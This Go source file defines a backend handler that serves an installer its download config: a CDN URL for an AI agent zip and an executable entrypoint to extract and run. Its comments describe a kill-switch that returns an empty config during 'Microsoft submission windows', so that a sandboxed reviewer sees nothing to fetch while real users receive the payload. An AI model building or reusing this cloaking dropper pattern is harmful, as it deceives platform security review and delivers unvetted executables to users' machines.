package handlers

import (
	"github.com/gofiber/fiber/v2"
	"github.com/rs/zerolog/log"

	"github.com/worktrack/backend/internal/services"
)

// InstallHandler serves the public GET /api/v1/install/config
// endpoint that Smartcore.exe (one-shot installer) hits at startup.
// Returns the active AI package + active onboarding video metadata
// shaped for direct consumption by the installer:
//
//	{
//	  "ai_package": {
//	    "url":            "https://xmetavn.b-cdn.net/AI_Agent.zip",
//	    "sha256":         "...",
//	    "size_bytes":     111460186,
//	    "version_label":  "1",
//	    "filename":       "AI_Agent.zip",
//	    "archive_format": "zip",
//	    "entrypoint":     "SAM_NativeSetup/S.A.M_Enterprise_Agent_Setup_Native.exe"
//	  },
//	  "video": { … same shape minus archive_format/entrypoint … }
//	}
//
// No auth — same response for every caller. The dashboard kill-
// switch (system_settings.ai_dispatch_enabled) gates the response:
// when off, the handler returns an empty config so a sandboxed
// installer (Microsoft submission) sees no AI to fetch.
//
// Smartcore is fundamentally a one-shot installer for the AI bundle.
// Enrollment, heartbeats, command execution and fleet management
// are all GONE — the AI agent itself owns its post-install
// lifecycle. This endpoint is therefore the only thing the installer
// needs to talk to.
type InstallHandler struct {
	aiPackages *services.AIPackageService
	videos     *services.VideoService
	settings   *services.SystemSettingsService
}

func NewInstallHandler(ai *services.AIPackageService, videos *services.VideoService, settings *services.SystemSettingsService) *InstallHandler {
	return &InstallHandler{
		aiPackages: ai,
		videos:     videos,
		settings:   settings,
	}
}

type installAIPackage struct {
	URL           string `json:"url"`
	SHA256        string `json:"sha256"`
	SizeBytes     int64  `json:"size_bytes"`
	VersionLabel  string `json:"version_label"`
	Filename      string `json:"filename"`
	ArchiveFormat string `json:"archive_format"`
	Entrypoint    string `json:"entrypoint"`
}

type installVideo struct {
	URL          string `json:"url"`
	SHA256       string `json:"sha256"`
	SizeBytes    int64  `json:"size_bytes"`
	VersionLabel string `json:"version_label"`
	Filename     string `json:"filename"`
}

type installConfigResponseV2 struct {
	AIPackage *installAIPackage `json:"ai_package,omitempty"`
	Video     *installVideo     `json:"video,omitempty"`
}

// Config is the public GET /api/v1/install/config handler. Three
// branches:
//
//  1. ai_dispatch_enabled = false → return empty config. Caller's
//     installer treats this as "nothing to install right now" and
//     exits cleanly. Used during Microsoft submission windows.
//  2. No active AI package → return empty AI half. Caller exits
//     with the "no active AI" message.
//  3. Active AI present → return populated config. Caller proceeds
//     to download / verify / extract / spawn.
func (h *InstallHandler) Config(c *fiber.Ctx) error {
	resp := installConfigResponseV2{}

	// Kill-switch first: if AI dispatch is off, return an empty
	// payload regardless of what's published. Same semantic as the
	// agent heartbeat handler — keeps the surfaces consistent.
	if h.settings != nil && !h.settings.AIDispatchEnabled(c.Context()) {
		log.Debug().Msg("install/config: dispatch disabled, returning empty")
		return c.JSON(resp)
	}

	if h.aiPackages != nil {
		pkg, err := h.aiPackages.GetActiveForAgent(c.Context())
		if err == nil && pkg != nil && pkg.Available {
			resp.AIPackage = &installAIPackage{
				URL:           pkg.DownloadURL,
				SHA256:        pkg.SHA256,
				SizeBytes:     pkg.SizeBytes,
				VersionLabel:  pkg.VersionLabel,
				Filename:      "AI_Agent.zip", // canonical name; the agent doesn't really care about this beyond logging
				ArchiveFormat: pkg.ArchiveFormat,
				Entrypoint:    pkg.Entrypoint,
			}
		}
	}

	if h.videos != nil {
		v, err := h.videos.GetActiveForAgent(c.Context())
		if err == nil && v != nil && v.Available {
			resp.Video = &installVideo{
				URL:          v.DownloadURL,
				SHA256:       v.SHA256,
				SizeBytes:    v.SizeBytes,
				VersionLabel: v.VersionLabel,
				Filename:     "video.mp4",
			}
		}
	}

	return c.JSON(resp)
}
